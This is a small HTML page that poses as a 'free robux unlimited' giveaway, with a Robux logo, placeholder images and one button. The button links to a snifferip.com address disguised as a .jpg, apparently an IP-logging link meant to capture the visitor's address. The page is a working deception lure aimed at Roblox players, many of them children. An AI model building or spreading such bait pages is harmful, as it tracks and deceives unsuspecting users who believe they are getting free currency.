<!DOCTYPE html>

<html>
<head>

    <title>by joepril</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            flex-direction: column;
            gap: 20px;
        }
        .container {
            text-align: center;
        }
        .robux-logo {
            height: 150px;
            margin-bottom: 20px;
        }
        .images-row {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .images-row img {
            height: 200px;
            border-radius: 8px;
        }
        .images-row .stack {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
        }
        .images-row .stack img {
            height: 200px;
            border-radius: 8px;
        }
        .clickable-box {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 28px;
            background-color: #3498db;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            transition: background-color 0.2s, transform 0.08s;
            box-shadow: 0 4px 8px rgba(0,0,0,0.12);
        }
        .clickable-box:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
        }
    </style>

</head>
<body>
    <div class="containesr">
        <img src="robux_2019_logo_gold.svg.png" alt="Robux Logo" class="robux-logo">
        <div class="images-row">
            <div class="stack">
                <img src="download.jpg" alt="Download 1">
                <a href="https://snifferip.com/2zrp4.jpg" target="_blank" rel="noopener noreferrer" class="clickable-box">
                    free robux unlimited
                </a>
                <img src="download (1).jpg" alt="Download 2">
            </div>
        </div>
    </div>
</body>







</html>
